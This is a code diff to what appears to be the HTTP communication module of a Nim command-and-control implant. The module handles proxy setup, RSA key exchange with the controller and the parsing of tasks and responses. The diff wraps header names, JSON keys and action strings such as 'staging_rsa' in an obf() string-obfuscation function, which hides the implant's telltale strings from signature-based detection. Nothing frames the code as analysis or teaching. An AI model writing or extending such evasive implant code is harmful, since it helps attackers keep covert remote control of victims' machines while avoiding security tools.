@@ -3,8 +3,9 @@ import ../config
 import ../utils/crypto
 import ../utils/http_client
 import ../utils/debug
+import ../utils/strenc
 
-const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "false").toLowerAscii in ["true", "t"]
+const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
 when encryptedExchange:
   import ../utils/rsa
 
@@ -58,7 +59,7 @@ proc newHttpProfile*(): HttpProfile =
     try:
       result.client = newClientWrapperWithProxy(proxyUrl)
       # Re-apply headers after creating new client with proxy
-      result.client.headers = newHttpHeaders({"User-Agent": result.config.userAgent})
+      result.client.headers = newHttpHeaders({obf("User-Agent"): result.config.userAgent})
       debug "[DEBUG] HTTP Profile: Re-applied User-Agent after proxy setup"
       if result.config.headers.len > 0:
         try:
@@ -106,9 +107,9 @@ proc send*(profile: HttpProfile, data: string, callbackUuid: string = ""): strin
     else:
       # For large payloads, show summary
       debug "[DEBUG] Request: Large payload (", data.len, " bytes)"
-      if jsonData.hasKey("action"):
+      if jsonData.hasKey(obf("action")):
         debug "[DEBUG] Action: ", jsonData["action"].getStr()
-      if jsonData.hasKey("responses"):
+      if jsonData.hasKey(obf("responses")):
         debug "[DEBUG] Responses count: ", jsonData["responses"].len
   except:
     # Not JSON or parse error, show raw
@@ -165,11 +166,11 @@ proc send*(profile: HttpProfile, data: string, callbackUuid: string = ""): strin
         else:
           # For large responses, show summary
           debug "[DEBUG] Response: Large payload (", result.len, " bytes)"
-          if jsonResp.hasKey("action"):
+          if jsonResp.hasKey(obf("action")):
             debug "[DEBUG] Action: ", jsonResp["action"].getStr()
-          if jsonResp.hasKey("responses"):
+          if jsonResp.hasKey(obf("responses")):
             debug "[DEBUG] Responses count: ", jsonResp["responses"].len
-          if jsonResp.hasKey("tasks"):
+          if jsonResp.hasKey(obf("tasks")):
             debug "[DEBUG] Tasks count: ", jsonResp["tasks"].len
       except:
         # Not JSON or parse error, show raw
@@ -226,9 +227,9 @@ proc performKeyExchange*(profile: var HttpProfile): tuple[success: bool, newUuid
       debug "[DEBUG] Session ID: ", sessionId
       # Build staging_rsa message
       let stagingMsg = %*{
-        "action": "staging_rsa",
-        "pub_key": encode(rsaKey.publicKeyPem),
-        "session_id": sessionId
+        obf("action"): obf("staging_rsa"),
+        obf("pub_key"): encode(rsaKey.publicKeyPem),
+        obf("session_id"): sessionId
       }
       let stagingStr = $stagingMsg
       debug "[DEBUG] Sending staging_rsa request..."
@@ -242,12 +243,12 @@ proc performKeyExchange*(profile: var HttpProfile): tuple[success: bool, newUuid
       debug "[DEBUG] Received key exchange response: ", response.len, " bytes"
       # Parse response
       let respJson = parseJson(response)
-      if not respJson.hasKey("session_key") or not respJson.hasKey("uuid"):
+      if not respJson.hasKey(obf("session_key")) or not respJson.hasKey(obf("uuid")):
         debug "[DEBUG] Key exchange failed: missing session_key or uuid in response"
         freeRsaKeyPair(rsaKey)
         return (false, "")
-      let encryptedSessionKey = decode(respJson["session_key"].getStr())
-      let newUuid = respJson["uuid"].getStr()
+      let encryptedSessionKey = decode(respJson[obf("session_key")].getStr())
+      let newUuid = respJson[obf("uuid")].getStr()
       debug "[DEBUG] Encrypted session key length: ", encryptedSessionKey.len, " bytes"
       debug "[DEBUG] New callback UUID: ", newUuid
       # Decrypt session key with RSA private key
